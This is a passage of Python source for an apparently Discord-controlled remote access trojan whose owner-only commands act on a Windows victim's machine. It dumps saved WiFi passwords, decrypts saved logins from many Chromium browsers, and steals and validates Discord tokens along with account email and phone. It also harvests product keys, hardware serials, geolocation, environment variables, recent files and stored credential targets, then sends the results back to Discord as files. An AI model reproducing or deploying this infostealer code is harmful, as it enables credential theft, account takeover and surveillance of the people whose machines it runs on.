                                    dx = int((dx / length) * 200)
                                    dy = int((dy / length) * 200)

                                    new_x = max(0, min(screen_width - 300, window_x + dx))
                                    new_y = max(0, min(screen_height - 100, window_y + dy))

                                    win32gui.SetWindowPos(
                                        hwnd,
                                        win32con.HWND_TOPMOST,
                                        new_x, new_y,
                                        300, 100,
                                        win32con.SWP_SHOWWINDOW
                                    )

                                    last_move_time = current_time

                                win32gui.InvalidateRect(hwnd, None, True)
                                win32gui.UpdateWindow(hwnd)

                            except Exception as e:
                                print(f"Dodge movement error: {e}")

                        time.sleep(0.016)  

                try:
                    win32gui.DestroyWindow(hwnd)
                    win32gui.UnregisterClass(class_name, wc.hInstance)
                except Exception as e:
                    print(f"Cleanup error: {e}")

            except Exception as e:
                print(f"Dodge thread error: {e}")

        thread = threading.Thread(target=dodge_thread)
        thread.daemon = True
        thread.start()

        await ctx.send("🎯 Dodging popup activated! Try to catch it for 30 seconds...")

    except Exception as e:
        await ctx.send(f"❌ Critical error: {str(e)}")

        import traceback
        traceback.print_exc()

@_c.command(name='getwifipass')
async def get_wifi_passwords(ctx):
    """Get all saved WiFi passwords"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        embed = discord.Embed(
            title="🌐 WiFi Password Recovery",
            description="Retrieving saved WiFi networks...",
            color=SOLARA_BLUE,
            timestamp=discord.utils.utcnow()
        )
        msg = await ctx.send(embed=embed)

        networks = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace")
        network_names = re.findall("All User Profile\s*: (.*)", networks)

        if not network_names:
            embed.description = "No WiFi networks found!"
            embed.color = SOLARA_ERROR
            await msg.edit(embed=embed)
            return

        results = []
        for name in network_names:
            try:
                name = name.strip()
                network_info = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', name, 'key=clear']).decode('utf-8', errors="backslashreplace")
                password = re.findall("Key Content\s*: (.*)", network_info)

                if password:
                    results.append(f"Network: {name}\nPassword: {password[0]}")
                else:
                    results.append(f"Network: {name}\nPassword: Not Found")
            except:
                continue

        embed.description = "WiFi Networks Found"
        embed.color = SOLARA_PURPLE

        chunks = [results[i:i+10] for i in range(0, len(results), 10)]
        for i, chunk in enumerate(chunks):
            embed.add_field(
                name=f"Networks {i*10+1}-{i*10+len(chunk)}",
                value="```\n" + "\n\n".join(chunk) + "\n```",
                inline=False
            )

        await msg.edit(embed=embed)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ WiFi Error",
            description=str(e),
            color=SOLARA_ERROR
        )
        await ctx.send(embed=error_embed)

def get_decryption_key(local_state_path):
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except:
        return None

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except:
        return "decryption failed"

@_c.command(name='passwords')
async def get_browser_passwords(ctx):
    """Get saved passwords from browsers"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        embed = discord.Embed(
            title="🔑 Password Recovery",
            description="Retrieving saved passwords...",
            color=SOLARA_BLUE,
            timestamp=discord.utils.utcnow()
        )
        msg = await ctx.send(embed=embed)

        browsers = {
            'amigo': os.getenv('LOCALAPPDATA') + '\\Amigo\\User Data',
            'torch': os.getenv('LOCALAPPDATA') + '\\Torch\\User Data',
            'kometa': os.getenv('LOCALAPPDATA') + '\\Kometa\\User Data',
            'orbitum': os.getenv('LOCALAPPDATA') + '\\Orbitum\\User Data',
            'cent-browser': os.getenv('LOCALAPPDATA') + '\\CentBrowser\\User Data',
            '7star': os.getenv('LOCALAPPDATA') + '\\7Star\\7Star\\User Data',
            'sputnik': os.getenv('LOCALAPPDATA') + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': os.getenv('LOCALAPPDATA') + '\\Vivaldi\\User Data',
            'google-chrome-sxs': os.getenv('LOCALAPPDATA') + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': os.getenv('LOCALAPPDATA') + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': os.getenv('LOCALAPPDATA') + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': os.getenv('LOCALAPPDATA') + '\\Microsoft\\Edge\\User Data',
            'uran': os.getenv('LOCALAPPDATA') + '\\uCozMedia\\Uran\\User Data',
            'yandex': os.getenv('LOCALAPPDATA') + '\\Yandex\\YandexBrowser\\User Data',
            'brave': os.getenv('LOCALAPPDATA') + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': os.getenv('LOCALAPPDATA') + '\\Iridium\\User Data',
        }

        results = {}
        for browser_name, browser_path in browsers.items():
            if not os.path.exists(browser_path):
                continue

            master_key = get_decryption_key(os.path.join(browser_path, "Local State"))
            if not master_key:
                continue

            results[browser_name] = []

            profiles = ["Default"] + [f"Profile {i}" for i in range(1, 11)]

            for profile in profiles:
                login_db = os.path.join(browser_path, profile, 'Login Data')
                if not os.path.exists(login_db):
                    continue

                temp_db = f"temp_{browser_name}_{profile}.db"
                try:
                    shutil.copy2(login_db, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')

                    for row in cursor.fetchall():
                        if not row[2]:  
                            continue
                        try:
                            password = decrypt_password(row[2], master_key)
                            results[browser_name].append({
                                'url': row[0],
                                'username': row[1],
                                'password': password
                            })
                        except:
                            continue

                    cursor.close()
                    conn.close()
                    os.remove(temp_db)
                except:
                    if os.path.exists(temp_db):
                        os.remove(temp_db)
                    continue

        for browser_name, passwords in results.items():
            if passwords:
                temp_file = f"{browser_name.lower()}_passwords.txt"
                with open(temp_file, 'w', encoding='utf-8') as f:
                    f.write(f"{browser_name} Saved Passwords\n{'='*50}\n\n")
                    for entry in passwords:
                        f.write(f"URL: {entry['url']}\n")
                        f.write(f"Username: {entry['username']}\n")
                        f.write(f"Password: {entry['password']}\n")
                        f.write("="*50 + "\n")

                await ctx.send(file=discord.File(temp_file))
                os.remove(temp_file)

                embed.add_field(
                    name=f"{browser_name}",
                    value=f"Found {len(passwords)} passwords. See attached file.",
                    inline=False
                )

        if not any(results.values()):
            embed.description = "No passwords found in any browser"
            embed.color = SOLARA_ERROR
        else:
            embed.description = "Password recovery complete!"
            embed.color = SOLARA_PURPLE

        await msg.edit(embed=embed)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ Password Recovery Error",
            description=str(e),
            color=SOLARA_ERROR
        )
        await ctx.send(embed=error_embed)

@_c.command(name='getdiscordinfo')
async def get_discord_info(ctx):
    """Get Discord token and user information"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        embed = discord.Embed(
            title="📱 Discord Information",
            description="Retrieving Discord data...",
            color=SOLARA_BLUE,
            timestamp=discord.utils.utcnow()
        )
        msg = await ctx.send(embed=embed)

        roaming = os.getenv('APPDATA')
        local = os.getenv('LOCALAPPDATA')

        discord_paths = {
            'Discord': roaming + '\\Discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Discord PTB': roaming + '\\discordptb',
            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
        }

        tokens = []

        for platform_name, path in discord_paths.items():
            if not os.path.exists(path):
                continue

            if 'Discord' in platform_name:

                local_state_path = os.path.join(path, 'Local State')
                if not os.path.exists(local_state_path):
                    continue

                with open(local_state_path, 'r', encoding='utf-8') as f:
                    local_state = json.loads(f.read())
                master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
                master_key = master_key[5:]
                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

                leveldb_path = os.path.join(path, 'Local Storage', 'leveldb')
                if os.path.exists(leveldb_path):
                    for file_name in os.listdir(leveldb_path):
                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                            continue

                        try:
                            with open(os.path.join(leveldb_path, file_name), errors='ignore') as f:
                                for line in f.readlines():
                                    for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                                        token_decoded = decrypt_password(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                                        if token_decoded not in [t['token'] for t in tokens]:
                                            tokens.append({
                                                'platform': platform_name,
                                                'token': token_decoded
                                            })
                        except:
                            continue
            else:

                leveldb_path = os.path.join(path, 'Local Storage', 'leveldb')
                if os.path.exists(leveldb_path):
                    for file_name in os.listdir(leveldb_path):
                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                            continue

                        try:
                            with open(os.path.join(leveldb_path, file_name), errors='ignore') as f:
                                for line in f.readlines():
                                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                                        for token in re.findall(regex, line.strip()):
                                            if token not in [t['token'] for t in tokens]:
                                                tokens.append({
                                                    'platform': platform_name,
                                                    'token': token
                                                })
                        except:
                            continue

        if tokens:

            temp_file = "discord_info.txt"
            with open(temp_file, 'w', encoding='utf-8') as f:
                f.write("Discord Information\n==================\n\n")
                for entry in tokens:
                    try:
                        headers = {'Authorization': entry['token']}
                        user_info = requests.get('https://discord.com/api/v9/users/@me', headers=headers).json()

                        if 'id' in user_info:
                            f.write(f"Platform: {entry['platform']}\n")
                            f.write(f"Token: {entry['token']}\n")
                            f.write(f"Username: {user_info.get('username')}#{user_info.get('discriminator')}\n")
                            f.write(f"Email: {user_info.get('email')}\n")
                            f.write(f"Phone: {user_info.get('phone')}\n")
                            f.write(f"2FA Enabled: {user_info.get('mfa_enabled')}\n")
                            f.write(f"Verified: {user_info.get('verified')}\n")
                            f.write("="*50 + "\n\n")
                    except:
                        continue

            await ctx.send(file=discord.File(temp_file))
            os.remove(temp_file)

            embed.description = f"Found {len(tokens)} Discord tokens"
            embed.color = SOLARA_PURPLE
            embed.add_field(
                name="📝 Results",
                value="Check the attached file for detailed information",
                inline=False
            )
        else:
            embed.description = "No Discord tokens found"
            embed.color = SOLARA_ERROR

        await msg.edit(embed=embed)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ Discord Info Error",
            description=str(e),
            color=SOLARA_ERROR
        )
        await ctx.send(embed=error_embed)

@_c.command(name='notepad')
async def open_notepad(ctx, *, text=""):
    """Open Notepad and write specified text"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        embed = discord.Embed(
            title="📝 Notepad",
            description="Opening Notepad...",
            color=SOLARA_BLUE,
            timestamp=discord.utils.utcnow()
        )
        msg = await ctx.send(embed=embed)

        notepad_process = subprocess.Popen(
            ["notepad.exe"], 
            creationflags=subprocess.CREATE_NEW_CONSOLE
        )

        time.sleep(1)

        def find_notepad_window():
            def callback(hwnd, hwnds):
                if win32gui.IsWindowVisible(hwnd) and "Notepad" in win32gui.GetWindowText(hwnd):
                    hwnds.append(hwnd)
                return True
            hwnds = []
            win32gui.EnumWindows(callback, hwnds)
            return hwnds[0] if hwnds else None

        notepad_hwnd = None
        for _ in range(5):  
            notepad_hwnd = find_notepad_window()
            if notepad_hwnd:
                break
            time.sleep(1)

        if not notepad_hwnd:
            raise Exception("Could not find Notepad window")

        win32gui.SetForegroundWindow(notepad_hwnd)

        if text:

            time.sleep(0.5)
            pyautogui.write(text)

        embed.description = f"Notepad opened successfully"
        if text:
            embed.add_field(
                name="Text Written",
                value=f"```\n{text[:1000]}\n```" + ("..." if len(text) > 1000 else ""),
                inline=False
            )
        embed.color = SOLARA_PURPLE
        await msg.edit(embed=embed)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ Notepad Error",
            description=str(e),
            color=SOLARA_ERROR
        )
        await ctx.send(embed=error_embed)

@_c.command(name='ip')
async def get_ip_info(ctx):
    """Get detailed IP address information"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        embed = discord.Embed(
            title="🌐 IP Address Information",
            description="Retrieving IP addresses...",
            color=SOLARA_BLUE,
            timestamp=discord.utils.utcnow()
        )
        msg = await ctx.send(embed=embed)

        hostname = socket.gethostname()

        try:
            public_ip = requests.get('https://api.ipify.org').text

            ip_details = requests.get(f'http://ip-api.com/json/{public_ip}').json()
        except Exception as e:
            public_ip = "Unable to fetch"
            ip_details = {}

        local_ips = []
        for interface in socket.getaddrinfo(hostname, None):
            if interface[4][0] not in local_ips and not interface[4][0].startswith('127.'):
                local_ips.append(interface[4][0])

        embed.description = "IP address information retrieved"
        embed.color = SOLARA_PURPLE

        embed.add_field(
            name="🌎 Public IP",
            value=f"`{public_ip}`",
            inline=False
        )

        if ip_details and ip_details.get('status') == 'success':
            geo_info = (
                f"**Country:** {ip_details.get('country', 'Unknown')}\n"
                f"**Region:** {ip_details.get('regionName', 'Unknown')}\n"
                f"**City:** {ip_details.get('city', 'Unknown')}\n"
                f"**ISP:** {ip_details.get('isp', 'Unknown')}\n"
                f"**Timezone:** {ip_details.get('timezone', 'Unknown')}"
            )
            embed.add_field(
                name="📍 Geolocation",
                value=geo_info,
                inline=False
            )

        if local_ips:
            embed.add_field(
                name="🖥️ Local IPs",
                value="\n".join([f"`{ip}`" for ip in local_ips]),
                inline=False
            )
        else:
            embed.add_field(
                name="🖥️ Local IPs",
                value="No local IPs found",
                inline=False
            )

        embed.add_field(
            name="💻 Hostname",
            value=f"`{hostname}`",
            inline=False
        )

        try:
            import uuid
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                           for elements in range(0, 48, 8)][::-1])
            embed.add_field(
                name="🔌 MAC Address",
                value=f"`{mac}`",
                inline=False
            )
        except:
            pass

        await msg.edit(embed=embed)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ IP Info Error",
            description=str(e),
            color=SOLARA_ERROR
        )
        await ctx.send(embed=error_embed)

@_c.command(name='advancedinfo', aliases=['fullinfo', 'sysinfo'])
async def advanced_system_info(ctx):
    """Collect comprehensive system and user information"""
    if ctx.author.id != OWNER_ID:
        return

    try:

        embed = discord.Embed(
            title="🔍 Advanced System Information",
            description="Collecting comprehensive system data...",
            color=SOLARA_BLUE,
            timestamp=discord.utils.utcnow()
        )
        status_msg = await ctx.send(embed=embed)

        temp_dir = "system_info"
        if not os.path.exists(temp_dir):
            os.makedirs(temp_dir)

        subdirs = ["system", "hardware", "network", "personal", "security", "software"]
        for subdir in subdirs:
            os.makedirs(os.path.join(temp_dir, subdir), exist_ok=True)

        all_info = {}

        embed.description = "Collecting basic system information..."
        await status_msg.edit(embed=embed)

        system_info = {
            "Hostname": socket.gethostname(),
            "OS": f"{platform.system()} {platform.release()} {platform.version()}",
            "Architecture": platform.machine(),
            "Processor": platform.processor(),
            "Boot Time": datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S"),
            "Current User": getpass.getuser(),
            "Computer Name": os.environ.get('COMPUTERNAME', 'Unknown'),
            "Domain": os.environ.get('USERDOMAIN', 'Unknown'),
            "System Directory": os.environ.get('SYSTEMROOT', 'Unknown'),
            "Current Directory": os.getcwd(),
            "Python Version": platform.python_version(),
            "System Uptime": str(datetime.now() - datetime.fromtimestamp(psutil.boot_time())),
            "Timezone": time.tzname[0]
        }

        if os.name == 'nt':
            try:
                key_cmd = 'powershell -command "(Get-WmiObject -query \'select * from SoftwareLicensingService\').OA3xOriginalProductKey"'
                product_key = subprocess.check_output(key_cmd, shell=True).decode('utf-8').strip()
                if product_key:
                    system_info["Windows Product Key"] = product_key
            except:
                pass

        all_info["SYSTEM"] = system_info

        embed.description = "Collecting hardware information..."
        await status_msg.edit(embed=embed)

        hardware_info = {}

        cpu_info = {
            "Physical Cores": psutil.cpu_count(logical=False),
            "Total Cores": psutil.cpu_count(logical=True),
            "Max Frequency": f"{psutil.cpu_freq().max:.2f}Mhz" if psutil.cpu_freq() else "Unknown",
            "Current Frequency": f"{psutil.cpu_freq().current:.2f}Mhz" if psutil.cpu_freq() else "Unknown",
            "CPU Usage": f"{psutil.cpu_percent()}%"
        }

        if os.name == 'nt':
            try:
                w = wmi.WMI()
                for processor in w.Win32_Processor():
                    cpu_info["Name"] = processor.Name
                    cpu_info["Manufacturer"] = processor.Manufacturer
                    cpu_info["Device ID"] = processor.DeviceID
                    cpu_info["Serial Number"] = processor.ProcessorId
                    break  
            except:
                pass

        hardware_info["CPU"] = cpu_info

        svmem = psutil.virtual_memory()
        memory_info = {
            "Total": f"{svmem.total/1024/1024/1024:.2f} GB",
            "Available": f"{svmem.available/1024/1024/1024:.2f} GB",
            "Used": f"{svmem.used/1024/1024/1024:.2f} GB",
            "Percentage": f"{svmem.percent}%"
        }
        hardware_info["Memory"] = memory_info

        disk_info = {}
        partitions = psutil.disk_partitions()
        for partition in partitions:
            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
                disk_info[partition.device] = {
                    "Mountpoint": partition.mountpoint,
                    "File System": partition.fstype,
                    "Total Size": f"{partition_usage.total/1024/1024/1024:.2f} GB",
                    "Used": f"{partition_usage.used/1024/1024/1024:.2f} GB",
                    "Free": f"{partition_usage.free/1024/1024/1024:.2f} GB",
                    "Percentage": f"{partition_usage.percent}%"
                }
            except:
                continue

        if os.name == 'nt':
            try:
                physical_disks = []
                for disk in w.Win32_DiskDrive():
                    physical_disks.append({
                        "Model": disk.Model,
                        "Manufacturer": disk.Manufacturer,
                        "Serial Number": disk.SerialNumber,
                        "Size": f"{int(disk.Size)/1024/1024/1024:.2f} GB" if disk.Size else "Unknown"
                    })
                disk_info["Physical Disks"] = physical_disks
            except:
                pass

        hardware_info["Disks"] = disk_info

        try:
            gpu_info = {}
            if os.name == 'nt':
                for gpu in w.Win32_VideoController():
                    gpu_info[gpu.Name] = {
                        "Driver Version": gpu.DriverVersion,
                        "Video Mode": gpu.VideoModeDescription,
                        "Current Resolution": f"{gpu.CurrentHorizontalResolution}x{gpu.CurrentVerticalResolution}" if gpu.CurrentHorizontalResolution else "Unknown",
                        "Adapter RAM": f"{int(gpu.AdapterRAM)/1024/1024:.2f} MB" if gpu.AdapterRAM else "Unknown"
                    }
            hardware_info["GPU"] = gpu_info
        except:
            hardware_info["GPU"] = "Failed to retrieve"

        all_info["HARDWARE"] = hardware_info

        embed.description = "Collecting network information..."
        await status_msg.edit(embed=embed)

        network_info = {}

        try:
            public_ip = requests.get('https://api.ipify.org').text
            geo_data = requests.get(f'http://ip-api.com/json/{public_ip}').json()

            network_info["Public IP"] = public_ip
            if geo_data.get('status') == 'success':
                network_info["Geolocation"] = {
                    "Country": geo_data.get('country', 'Unknown'),
                    "Region": geo_data.get('regionName', 'Unknown'),
                    "City": geo_data.get('city', 'Unknown'),
                    "ZIP": geo_data.get('zip', 'Unknown'),
                    "ISP": geo_data.get('isp', 'Unknown'),
                    "Organization": geo_data.get('org', 'Unknown'),
                    "AS Number": geo_data.get('as', 'Unknown'),
                    "Timezone": geo_data.get('timezone', 'Unknown'),
                    "Coordinates": f"{geo_data.get('lat', '?')}, {geo_data.get('lon', '?')}"
                }
        except:
            network_info["Public IP"] = "Failed to retrieve"

        interfaces = {}
        for interface_name, interface_addresses in psutil.net_if_addrs().items():
            addresses = []
            for address in interface_addresses:
                if address.family == socket.AF_INET:
                    addresses.append({
                        "IP": address.address,
                        "Netmask": address.netmask,
                        "Broadcast": address.broadcast
                    })
                elif address.family == socket.AF_INET6:
                    addresses.append({
                        "IPv6": address.address
                    })
                elif address.family == psutil.AF_LINK:
                    addresses.append({
                        "MAC": address.address
                    })
            interfaces[interface_name] = addresses
        network_info["Interfaces"] = interfaces

        wifi_profiles = {}
        try:
            wifi_output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace")
            wifi_names = re.findall("All User Profile\s*: (.*)", wifi_output)

            for name in wifi_names:
                name = name.strip()
                try:
                    wifi_info = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', name, 'key=clear']).decode('utf-8', errors="backslashreplace")
                    password = re.findall("Key Content\s*: (.*)", wifi_info)
                    auth_type = re.findall("Authentication\s*: (.*)", wifi_info)
                    encryption = re.findall("Cipher\s*: (.*)", wifi_info)

                    wifi_profiles[name] = {
                        "Password": password[0] if password else "No password found",
                        "Authentication": auth_type[0] if auth_type else "Unknown",
                        "Encryption": encryption[0] if encryption else "Unknown"
                    }
                except:
                    continue
        except:
            wifi_profiles = {"Error": "Failed to retrieve WiFi profiles"}
        network_info["WiFi Profiles"] = wifi_profiles

        all_info["NETWORK"] = network_info

        embed.description = "Collecting user information..."
        await status_msg.edit(embed=embed)

        user_info = {
            "Username": getpass.getuser(),
            "Home Directory": os.path.expanduser("~"),
            "Documents Path": os.path.join(os.path.expanduser("~"), "Documents"),
            "Desktop Path": os.path.join(os.path.expanduser("~"), "Desktop"),
            "Downloads Path": os.path.join(os.path.expanduser("~"), "Downloads"),
            "Pictures Path": os.path.join(os.path.expanduser("~"), "Pictures"),
            "Music Path": os.path.join(os.path.expanduser("~"), "Music"),
            "Videos Path": os.path.join(os.path.expanduser("~"), "Videos")
        }

        if os.name == 'nt':
            try:
                for user in w.Win32_UserAccount():
                    if user.Name.lower() == getpass.getuser().lower():
                        user_info["Full Name"] = user.FullName
                        user_info["SID"] = user.SID
                        user_info["Domain"] = user.Domain
                        user_info["Account Type"] = user.AccountType
                        user_info["Status"] = "Enabled" if not user.Disabled else "Disabled"
                        break
            except:
                pass

        env_vars = {}
        for key, value in os.environ.items():
            env_vars[key] = value
        user_info["Environment Variables"] = env_vars

        try:
            recent_files = []
            recent_dir = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Recent")
            if os.path.exists(recent_dir):
                for file in os.listdir(recent_dir)[:50]:  
                    if file.endswith('.lnk'):
                        recent_files.append(file.replace('.lnk', ''))
            user_info["Recent Files"] = recent_files
        except:
            user_info["Recent Files"] = "Failed to retrieve"

        all_info["USER"] = user_info

        embed.description = "Collecting security information..."
        await status_msg.edit(embed=embed)

        security_info = {}

        if os.name == 'nt':
            try:
                defender_status = subprocess.check_output('powershell -Command "Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled"', shell=True).decode('utf-8')
                security_info["Windows Defender"] = "Enabled" if "True" in defender_status else "Disabled"
            except:
                security_info["Windows Defender"] = "Failed to retrieve"

        if os.name == 'nt':
            try:
                firewall_status = subprocess.check_output('netsh advfirewall show allprofiles state', shell=True).decode('utf-8')
                security_info["Firewall"] = "Enabled" if "ON" in firewall_status else "Disabled"
            except:
                security_info["Firewall"] = "Failed to retrieve"

        if os.name == 'nt':
            try:
                key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                uac_value = winreg.QueryValueEx(key, "EnableLUA")[0]
                security_info["UAC"] = "Enabled" if uac_value == 1 else "Disabled"
                winreg.CloseKey(key)
            except:
                security_info["UAC"] = "Failed to retrieve"

        if os.name == 'nt':
            try:
                creds_output = subprocess.check_output('cmdkey /list', shell=True).decode('utf-8', errors='ignore')
                creds_entries = re.findall(r'Target: (.+)', creds_output)
                security_info["Saved Credentials"] = creds_entries if creds_entries else "None found"
            except:
                security_info["Saved Credentials"] = "Failed to retrieve"

        all_info["SECURITY"] = security_info

        embed.description = "Generating report files..."
        await status_msg.edit(embed=embed)

        json_path = os.path.join(temp_dir, "system_info.json")
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(all_info, f, indent=4, default=str)

        sys_overview_path = os.path.join(temp_dir, "system", "system_overview.txt")
        with open(sys_overview_path, 'w', encoding='utf-8') as f:
            f.write(f"{'='*50}\n")
            f.write(f"{' '*15}SYSTEM INFORMATION\n")
            f.write(f"{'='*50}\n\n")

            f.write(f"📌 Basic Information\n")
            f.write(f"{'─'*30}\n")
            f.write(f"💻 Hostname: {all_info['SYSTEM']['Hostname']}\n")
            f.write(f"🖥️ Computer Name: {all_info['SYSTEM'].get('Computer Name', 'Unknown')}\n")
            f.write(f"👤 Current User: {all_info['SYSTEM']['Current User']}\n")
            f.write(f"🏢 Domain: {all_info['SYSTEM'].get('Domain', 'Unknown')}\n\n")

            f.write(f"📌 Operating System\n")
            f.write(f"{'─'*30}\n")
            f.write(f"🪟 OS: {all_info['SYSTEM']['OS']}\n")
            f.write(f"⚙️ Architecture: {all_info['SYSTEM']['Architecture']}\n")
            if "Windows Product Key" in all_info['SYSTEM']:
                f.write(f"🔑 Product Key: {all_info['SYSTEM']['Windows Product Key']}\n")
            f.write(f"📂 System Directory: {all_info['SYSTEM'].get('System Directory', 'Unknown')}\n")
            f.write(f"📁 Current Directory: {all_info['SYSTEM']['Current Directory']}\n\n")

            f.write(f"📌 Time Information\n")
            f.write(f"{'─'*30}\n")
            f.write(f"⏰ Boot Time: {all_info['SYSTEM']['Boot Time']}\n")
            f.write(f"⌛ System Uptime: {all_info['SYSTEM'].get('System Uptime', 'Unknown')}\n")
            f.write(f"🌐 Timezone: {all_info['SYSTEM'].get('Timezone', 'Unknown')}\n\n")

        hw_overview_path = os.path.join(temp_dir, "hardware", "hardware_overview.txt")
        with open(hw_overview_path, 'w', encoding='utf-8') as f:
            f.write(f"{'='*50}\n")
            f.write(f"{' '*15}HARDWARE INFORMATION\n")
            f.write(f"{'='*50}\n\n")

            f.write(f"📌 CPU Information\n")
            f.write(f"{'─'*30}\n")

            if "Name" in all_info["HARDWARE"]["CPU"]:
                f.write(f"🔶 Model: {all_info['HARDWARE']['CPU']['Name']}\n")

            f.write(f"🔢 Physical Cores: {all_info['HARDWARE']['CPU']['Physical Cores']}\n")
            f.write(f"🔢 Total Cores: {all_info['HARDWARE']['CPU']['Total Cores']}\n")
            f.write(f"⚡ Max Frequency: {all_info['HARDWARE']['CPU']['Max Frequency']}\n")
            f.write(f"⚡ Current Frequency: {all_info['HARDWARE']['CPU']['Current Frequency']}\n")
            f.write(f"📊 CPU Usage: {all_info['HARDWARE']['CPU']['CPU Usage']}\n")

            if "Manufacturer" in all_info["HARDWARE"]["CPU"]:
                f.write(f"🏭 Manufacturer: {all_info['HARDWARE']['CPU']['Manufacturer']}\n")

            if "Serial Number" in all_info["HARDWARE"]["CPU"]:
                f.write(f"🔢 Serial Number: {all_info['HARDWARE']['CPU']['Serial Number']}\n")
            f.write("\n")

            f.write(f"📌 Memory Information\n")
            f.write(f"{'─'*30}\n")
            f.write(f"💾 Total RAM: {all_info['HARDWARE']['Memory']['Total']}\n")
            f.write(f"✅ Available: {all_info['HARDWARE']['Memory']['Available']}\n")
            f.write(f"⚠️ Used: {all_info['HARDWARE']['Memory']['Used']}\n")
            f.write(f"📊 Usage: {all_info['HARDWARE']['Memory']['Percentage']}\n\n")

            f.write(f"📌 Storage Information\n")
            f.write(f"{'─'*30}\n")

            for device, disk_info in all_info["HARDWARE"]["Disks"].items():
                if device != "Physical Disks":
                    f.write(f"💿 Drive {device}\n")
                    f.write(f"  📂 Mountpoint: {disk_info['Mountpoint']}\n")
                    f.write(f"  🗃️ File System: {disk_info['File System']}\n")
                    f.write(f"  💾 Total Size: {disk_info['Total Size']}\n")
                    f.write(f"  ⚠️ Used: {disk_info['Used']}\n")
                    f.write(f"  ✅ Free: {disk_info['Free']}\n")
                    f.write(f"  📊 Usage: {disk_info['Percentage']}\n\n")

            if "Physical Disks" in all_info["HARDWARE"]["Disks"]:
                f.write(f"📌 Physical Drives\n")
                f.write(f"{'─'*30}\n")

                for i, disk in enumerate(all_info["HARDWARE"]["Disks"]["Physical Disks"]):
                    f.write(f"🔷 Disk {i+1}: {disk.get('Model', 'Unknown')}\n")
                    f.write(f"  🏭 Manufacturer: {disk.get('Manufacturer', 'Unknown')}\n")
                    f.write(f"  💾 Size: {disk.get('Size', 'Unknown')}\n")
                    f.write(f"  🔢 Serial: {disk.get('Serial Number', 'Unknown')}\n")
                    if "Interface Type" in disk:
                        f.write(f"  🔌 Interface: {disk['Interface Type']}\n")
                    if "Status" in disk:
                        f.write(f"  ⚙️ Status: {disk['Status']}\n")
                    f.write("\n")

            if "GPU" in all_info["HARDWARE"] and isinstance(all_info["HARDWARE"]["GPU"], dict):
                f.write(f"📌 GPU Information\n")
                f.write(f"{'─'*30}\n")

                for gpu_name, gpu_details in all_info["HARDWARE"]["GPU"].items():
                    f.write(f"🎮 {gpu_name}\n")
                    for key, value in gpu_details.items():
                        icon = "🔢"
                        if "Version" in key:
                            icon = "🔄"
                        elif "Resolution" in key:
                            icon = "🖥️"
                        elif "RAM" in key:
                            icon = "💾"
                        elif "Mode" in key:
                            icon = "📺"

                        f.write(f"  {icon} {key}: {value}\n")
                    f.write("\n")

        net_overview_path = os.path.join(temp_dir, "network", "network_overview.txt")
        with open(net_overview_path, 'w', encoding='utf-8') as f:
            f.write(f"{'='*50}\n")
            f.write(f"{' '*15}NETWORK INFORMATION\n")
            f.write(f"{'='*50}\n\n")

            f.write(f"📌 Internet Connection\n")
            f.write(f"{'─'*30}\n")
            f.write(f"🌐 Public IP: {all_info['NETWORK'].get('Public IP', 'Unknown')}\n\n")

            if "Geolocation" in all_info["NETWORK"]:
                geo = all_info["NETWORK"]["Geolocation"]
                f.write(f"📌 Geolocation\n")
                f.write(f"{'─'*30}\n")
                f.write(f"🗺️ Country: {geo.get('Country', 'Unknown')}\n")
                f.write(f"🏙️ Region: {geo.get('Region', 'Unknown')}\n")
                f.write(f"🏙️ City: {geo.get('City', 'Unknown')}\n")
                f.write(f"📮 ZIP Code: {geo.get('ZIP', 'Unknown')}\n")
